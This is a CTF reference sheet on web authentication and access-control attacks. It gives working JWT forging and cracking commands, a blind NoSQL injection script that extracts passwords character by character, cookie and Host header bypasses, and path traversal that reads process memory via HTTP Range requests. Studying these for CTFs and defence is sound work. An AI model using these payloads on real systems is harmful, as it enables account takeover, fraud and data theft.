# CTF Web - Auth & Access Control Attacks

## Table of Contents
- [JWT Attacks](#jwt-attacks)
  - [Algorithm None](#algorithm-none)
  - [Algorithm Confusion (RS256 → HS256)](#algorithm-confusion-rs256-hs256)
  - [Weak Secret Brute-Force](#weak-secret-brute-force)
  - [JWT Balance Replay (MetaShop Pattern)](#jwt-balance-replay-metashop-pattern)
- [Password/Secret Inference from Public Data](#passwordsecret-inference-from-public-data)
- [Weak Signature/Hash Validation Bypass](#weak-signaturehash-validation-bypass)
- [Client-Side Access Gate Bypass](#client-side-access-gate-bypass)
- [NoSQL Injection (MongoDB)](#nosql-injection-mongodb)
  - [Blind NoSQL with Binary Search](#blind-nosql-with-binary-search)
- [Cookie Manipulation](#cookie-manipulation)
- [Host Header Bypass](#host-header-bypass)
- [Broken Auth: Always-True Hash Check (0xFun 2026)](#broken-auth-always-true-hash-check-0xfun-2026)
- [/proc/self/mem via HTTP Range Requests (UTCTF 2024)](#procselfmem-via-http-range-requests-utctf-2024)
- [Hidden API Endpoints](#hidden-api-endpoints)

---

## JWT Attacks

### Algorithm None
Remove signature, set `"alg": "none"` in header.

### Algorithm Confusion (RS256 → HS256)
App accepts both RS256 and HS256, uses public key for both:
```javascript
const jwt = require('jsonwebtoken');
const publicKey = '-----BEGIN PUBLIC KEY-----\n...\n-----END PUBLIC KEY-----';
const token = jwt.sign({ username: 'admin' }, publicKey, { algorithm: 'HS256' });
```

### Weak Secret Brute-Force
```bash
flask-unsign --decode --cookie "eyJ..."
hashcat -m 16500 jwt.txt wordlist.txt
```

### JWT Balance Replay (MetaShop Pattern)
1. Sign up → get JWT with balance=$100 (save this JWT)
2. Buy items → balance drops to $0
3. Replace cookie with saved JWT (balance back to $100)
4. Return all items → server adds prices to JWT's $100 balance
5. Repeat until balance exceeds target price

**Key insight:** Server trusts the balance in the JWT for return calculations but doesn't cross-check purchase history.

---

## Password/Secret Inference from Public Data

**Pattern (0xClinic):** Registration uses structured identifier (e.g., National ID) as password. Profile endpoints expose enough to reconstruct most of it.

**Exploitation flow:**
1. Find profile/API endpoints that leak "public" user data (DOB, gender, location)
2. Understand identifier format (e.g., Egyptian National ID = century + YYMMDD + governorate + 5 digits)
3. Calculate brute-force space: known digits reduce to ~50,000 or less
4. Brute-force login with candidate IDs

---

## Weak Signature/Hash Validation Bypass

**Pattern (Illegal Logging Network):** Validation only checks first N characters of hash:
```javascript
const expected = sha256(secret + permitId).slice(0, 16);
if (sig.toLowerCase().startsWith(expected.slice(0, 2))) { // only 2 chars!
    // Token accepted
}
```
Only need to match 2 hex chars (256 possibilities). Brute-force trivially.

**Detection:** Look for `.slice()`, `.substring()`, `.startsWith()` on hash values.

---

## Client-Side Access Gate Bypass

**Pattern (Endangered Access):** JS gate checks URL parameter or global variable:
```javascript
const hasAccess = urlParams.get('access') === 'letmein' || window.overrideAccess === true;
```

**Bypass:**
1. URL parameter: `?access=letmein`
2. Console: `window.overrideAccess = true`
3. Direct API call — skip UI entirely

---

## NoSQL Injection (MongoDB)

### Blind NoSQL with Binary Search
```python
def extract_char(position, session):
    low, high = 32, 126
    while low < high:
        mid = (low + high) // 2
        payload = f"' && this.password.charCodeAt({position}) > {mid} && 'a'=='a"
        resp = session.post('/login', data={'username': payload, 'password': 'x'})
        if "Something went wrong" in resp.text:
            low = mid + 1
        else:
            high = mid
    return chr(low)
```

**Why simple boolean injection fails:** App queries with injected `$where`, then checks if returned user's credentials match input exactly. `'||1==1||'` finds admin but fails the credential check.

---

## Cookie Manipulation
```bash
curl -H "Cookie: role=admin"
curl -H "Cookie: isAdmin=true"
```

## Host Header Bypass
```http
GET /flag HTTP/1.1
Host: 127.0.0.1
```

## Broken Auth: Always-True Hash Check (0xFun 2026)

**Pattern:** Auth function uses `if sha256(user_input)` instead of comparing hash to expected value.

```python
# VULNERABLE:
if sha256(password.encode()).hexdigest():  # Always truthy (non-empty string)
    grant_access()

# CORRECT:
if sha256(password.encode()).hexdigest() == expected_hash:
    grant_access()
```

**Detection:** Source code review for hash functions used in boolean context without comparison.

---

## /proc/self/mem via HTTP Range Requests (UTCTF 2024)

**Pattern (Home on the Range):** Flag loaded into process memory then deleted from disk.

**Attack chain:**
1. Path traversal to read `../../server.py`
2. Read `/proc/self/maps` to get memory layout
3. Use `Range: bytes=START-END` HTTP header against `/proc/self/mem`
4. Search binary output for flag string

```bash
# Get memory ranges
curl 'http://target/../../proc/self/maps'
# Read specific memory range
curl -H 'Range: bytes=94200000000000-94200000010000' 'http://target/../../proc/self/mem'
```

---

## Custom Linear MAC/Signature Forgery (Nullcon 2026)

**Pattern (Pasty):** Custom MAC built from SHA-256 with linear structure. Each output block is a linear combination of hash blocks and one of N secret blocks.

**Attack:**
1. Create a few valid `(id, signature)` pairs via normal API
2. Compute `SHA256(id)` for each pair
3. Reverse-engineer which secret block is used at each position (determined by `hash[offset] % N`)
4. Recover all N secret blocks from known pairs
5. Forge signature for target ID (e.g., `id=flag`)

```python
# Given signature structure: out[i] = hash_block[i] XOR secret[selector] XOR chain
# Recover secret blocks from known pairs
for id, sig in known_pairs:
    h = sha256(id.encode())
    for i in range(num_blocks):
        selector = h[i*8] % num_secrets
        secret = derive_secret_from_block(h, sig, i)
        secrets[selector] = secret

# Forge for target
target_sig = build_signature(secrets, b"flag")
```

**Key insight:** When a custom MAC uses hash output to SELECT between secret components (rather than mixing them cryptographically), recovering those components from a few samples is trivial. Always check custom crypto constructions for linearity.

---

## Hidden API Endpoints
Search JS bundles for `/api/internal/`, `/api/admin/`, undocumented endpoints.
